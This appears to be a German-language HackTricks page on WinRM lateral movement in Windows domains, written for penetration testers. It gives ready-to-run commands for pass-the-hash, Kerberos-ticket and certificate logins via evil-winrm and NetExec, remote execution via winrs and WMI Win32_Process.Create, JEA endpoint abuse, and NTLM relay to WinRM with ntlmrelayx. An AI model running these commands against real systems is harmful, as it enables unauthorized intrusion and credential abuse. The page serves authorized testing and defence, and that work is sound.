# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ist einer der bequemsten **lateral movement**-Transporte in Windows-Umgebungen, weil er dir eine Remote-Shell über **WS-Man/HTTP(S)** gibt, ohne dass du SMB-Service-Erstellungs-Tricks brauchst. Wenn das Ziel **5985/5986** exponiert und dein Principal für Remoting berechtigt ist, kannst du oft sehr schnell von „valid creds“ zu „interactive shell“ kommen.

Für die **protocol/service enumeration**, Listener, das Aktivieren von WinRM, `Invoke-Command` und die generische Client-Nutzung, siehe:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Nutzt **HTTP/HTTPS** statt SMB/RPC, daher funktioniert es oft dort, wo PsExec-style execution blockiert ist.
- Mit **Kerberos** werden keine wiederverwendbaren Credentials an das Ziel gesendet.
- Funktioniert sauber mit **Windows**, **Linux** und **Python**-Tools (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Der interaktive PowerShell-Remoting-Pfad startet **`wsmprovhost.exe`** auf dem Ziel im Kontext des authentifizierten Users, was operativ anders ist als service-based exec.

## Access model and prerequisites

In der Praxis hängt erfolgreiches WinRM lateral movement von **drei** Dingen ab:

1. Das Ziel hat einen **WinRM listener** (`5985`/`5986`) und Firewall-Regeln, die Zugriff erlauben.
2. Das Konto kann sich am Endpoint **authentifizieren**.
3. Das Konto darf eine **remoting session** öffnen.

Gängige Wege, um diesen Zugriff zu erhalten:

- **Local Administrator** auf dem Ziel.
- Mitgliedschaft in **Remote Management Users** auf neueren Systemen oder **WinRMRemoteWMIUsers__** auf Systemen/Komponenten, die diese Gruppe noch berücksichtigen.
- Explizit delegierte Remoting-Rechte über lokale Sicherheitsdeskriptoren / Änderungen an PowerShell-remoting-ACLs.

Wenn du bereits eine Box mit Admin-Rechten kontrollierst, denk daran, dass du WinRM-Zugriff auch **ohne volle Admin-Group-Mitgliedschaft** delegieren kannst, indem du die hier beschriebenen Techniken nutzt:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. Wenn du per IP verbindest, fällt der Client normalerweise auf **NTLM/Negotiate** zurück.
- In **workgroup**- oder Cross-Trust-Edge-Cases benötigt NTLM oft entweder **HTTPS** oder das Ziel muss auf dem Client zu **TrustedHosts** hinzugefügt werden.
- Mit **local accounts** über Negotiate in einer Workgroup können UAC remote restrictions den Zugriff verhindern, außer das integrierte Administrator-Konto wird verwendet oder `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting verwendet standardmäßig den **`HTTP/<host>` SPN**. In Umgebungen, in denen `HTTP/<host>` bereits einem anderen Service-Account zugeordnet ist, kann WinRM Kerberos mit `0x80090322` fehlschlagen; nutze einen port-qualifizierten SPN oder wechsle zu **`WSMAN/<host>`**, wo dieser SPN existiert.

Wenn du während eines Password Spraying gültige Credentials findest, ist die Verifikation über WinRM oft der schnellste Weg zu prüfen, ob daraus eine Shell wird:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM für interaktive Shells

`evil-winrm` bleibt die bequemste interaktive Option von Linux aus, da es **Passwörter**, **NT-Hashes**, **Kerberos-Tickets**, **Client-Zertifikate**, Dateiübertragung und das Laden von PowerShell/.NET im Speicher unterstützt.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Wenn der Standard-**`HTTP/<host>`**-SPN Kerberos-Fehler verursacht, versuche stattdessen, ein **`WSMAN/<host>`**-Ticket anzufordern/zu verwenden. Das tritt in gehärteten oder ungewöhnlichen Enterprise-Setups auf, in denen **`HTTP/<host>`** bereits an ein anderes Service-Account gebunden ist.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Dies ist auch nach **RBCD / S4U**-Missbrauch nützlich, wenn du speziell ein **WSMAN**-Service-Ticket statt eines generischen `HTTP`-Tickets gefälscht oder angefordert hast.

### Certificate-based authentication

WinRM unterstützt auch **client certificate authentication**, aber das Zertifikat muss auf dem Ziel auf ein **local account** gemappt sein. Aus offensiver Sicht ist das relevant, wenn:

- du bereits ein gültiges client certificate und den private key gestohlen/exportiert hast, die für WinRM gemappt sind;
- du **AD CS / Pass-the-Certificate** missbraucht hast, um ein Zertifikat für einen principal zu erhalten und dann in einen anderen authentication path zu pivoten;
- du in Umgebungen arbeitest, die bewusst password-based remoting vermeiden.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-Zertifikat-WinRM ist viel seltener als Passwort-/Hash-/Kerberos-Auth, aber wenn es existiert, kann es einen **passwordless lateral movement**-Pfad bieten, der Passwortrotation überlebt.

### Python / automation mit `pypsrp`

Wenn du Automation statt einer Operator-Shell brauchst, bietet dir `pypsrp` WinRM/PSRP aus Python mit Unterstützung für **NTLM**, **certificate auth**, **Kerberos** und **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Wenn du feinere Kontrolle brauchst als der High-Level-`Client`-Wrapper bietet, sind die niedrigeren `WSMan` + `RunspacePool` APIs für zwei häufige Operator-Probleme nützlich:

- Erzwingen von **`WSMAN`** als Kerberos service/SPN statt der standardmäßigen `HTTP`-Erwartung, die von vielen PowerShell-Clients verwendet wird;
- Verbinden mit einem **non-default PSRP endpoint** wie einer **JEA** / custom session configuration statt `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Benutzerdefinierte PSRP endpoints und JEA sind bei lateral movement wichtig

Eine erfolgreiche WinRM-Authentifizierung bedeutet **nicht** immer, dass du im standardmäßigen, uneingeschränkt verfügbaren `Microsoft.PowerShell`-Endpoint landest. Reife Umgebungen können **benutzerdefinierte session configurations** oder **JEA**-Endpoints mit eigenen ACLs und run-as-Verhalten bereitstellen.

Wenn du bereits Code Execution auf einem Windows-Host hast und verstehen willst, welche remoting-Oberflächen vorhanden sind, enumeriere die registrierten Endpoints:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Wenn ein nützlicher Endpunkt existiert, ziele explizit darauf ab statt auf die Default-Shell:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Praktische offensive Auswirkungen:

- Ein **eingeschränktes** Endpoint kann für laterale Bewegung dennoch ausreichen, wenn es genau die richtigen Cmdlets/Funktionen für Service-Steuerung, Dateizugriff, Prozesserstellung oder beliebige .NET- / externe Command-Ausführung freigibt.
- Ein **fehlkonfiguriertes JEA**-Role ist besonders wertvoll, wenn es gefährliche Commands wie `Start-Process`, breite Wildcards, schreibbare Provider oder benutzerdefinierte Proxy-Funktionen freigibt, die es dir erlauben, die vorgesehenen Einschränkungen zu umgehen.
- Endpoints, die auf **RunAs virtual accounts** oder **gMSAs** basieren, ändern den effektiven Security Context der ausgeführten Commands. Insbesondere kann ein gMSA-basierter Endpoint **Network Identity auf dem zweiten Hop** bereitstellen, selbst wenn eine normale WinRM-Session am klassischen Delegation Problem scheitern würde.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` ist integriert und nützlich, wenn du **native WinRM command execution** möchtest, ohne eine interaktive PowerShell remoting session zu öffnen:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Zwei Flags sind leicht zu vergessen und sind in der Praxis wichtig:

- `/noprofile` ist oft erforderlich, wenn der entfernte Principal **kein** lokaler Administrator ist.
- `/allowdelegate` ermöglicht der Remote-Shell, deine Credentials gegen einen **dritten Host** zu verwenden (zum Beispiel, wenn der Befehl `\\fileserver\share` benötigt).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Betrieblich führt `winrs.exe` häufig zu einer Remote-Prozesskette ähnlich der folgenden:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Dies ist es wert, sich zu merken, weil es sich von service-based exec und von interaktiven PSRP sessions unterscheidet.

### `winrm.cmd` / WS-Man COM statt PowerShell remoting

Du kannst auch über **WinRM transport** ausführen, ohne `Enter-PSSession` zu verwenden, indem du WMI classes über WS-Man aufrufst. Dadurch bleibt der transport **WinRM**, während das Remote-Execution-Primitive zu **WMI `Win32_Process.Create`** wird:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Dieser Ansatz ist nützlich, wenn:

- PowerShell-Logging stark überwacht wird.
- Du **WinRM transport** möchtest, aber keinen klassischen PS remoting workflow.
- Du eigene Tools rund um das **`WSMan.Automation`**-COM-Objekt entwickelst oder verwendest.

## NTLM relay zu WinRM (WS-Man)

Wenn SMB relay durch Signing blockiert ist und LDAP relay eingeschränkt ist, kann **WS-Man/WinRM** trotzdem ein attraktives relay-Ziel sein. Moderne `ntlmrelayx.py` enthält **WinRM relay servers** und kann auf **`wsman://`**- oder **`winrms://`**-Ziele relayn.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Zwei praktische Hinweise:

- Relay ist am nützlichsten, wenn das Ziel **NTLM** akzeptiert und der relayed principal WinRM verwenden darf.
- Neuerer Impacket-Code behandelt speziell **`WSMANIDENTIFY: unauthenticated`**-Requests, damit **`Test-WSMan`**-ähnliche Probes den Relay-Flow nicht unterbrechen.

Für Multi-Hop-Constraints nach dem ersten WinRM-Session-Landing, siehe:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC- und Erkennungs-Hinweise

- **Interaktives PowerShell remoting** erstellt auf dem Ziel normalerweise **`wsmprovhost.exe`**.
- **`winrs.exe`** erstellt üblicherweise **`winrshost.exe`** und danach den angeforderten Child-Process.
- Eigene **JEA**-Endpoints können Aktionen als **`WinRM_VA_*`**-virtuelle Accounts oder als konfigurierte **gMSA** ausführen, was sowohl Telemetrie als auch Second-Hop-Verhalten im Vergleich zu einer normalen User-Context-Shell verändert.
- Rechne mit **network logon**-Telemetrie, WinRM-Service-Events und PowerShell operational/script-block logging, wenn du PSRP statt reinem `cmd.exe` verwendest.
- Wenn du nur einen einzelnen Befehl brauchst, kann `winrs.exe` oder eine einmalige WinRM-Ausführung leiser sein als eine langlebige interaktive remoting session.
- Wenn Kerberos verfügbar ist, bevorzuge **FQDN + Kerberos** statt IP + NTLM, um sowohl Trust-Probleme als auch umständliche clientseitige `TrustedHosts`-Änderungen zu reduzieren.

## Referenzen

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
